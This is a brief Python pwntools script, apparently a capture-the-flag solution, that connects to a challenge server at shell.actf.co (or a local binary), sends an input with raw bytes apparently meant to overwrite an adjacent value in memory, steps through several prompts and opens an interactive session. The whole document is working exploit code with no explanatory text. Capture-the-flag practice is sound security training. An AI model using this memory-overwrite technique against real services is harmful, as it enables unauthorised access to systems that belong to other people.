#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21300)
else:
    r = process('./test')

r.sendlineafter("to do? ", "1")
r.sendlineafter("conditions? ", "XXXX\x39\x05")
r.sendlineafter("conditions? ", "yes")
r.sendlineafter("Sign here: ", "q")
r.sendlineafter("your name: ", "q")
r.sendline("2")
r.interactive()
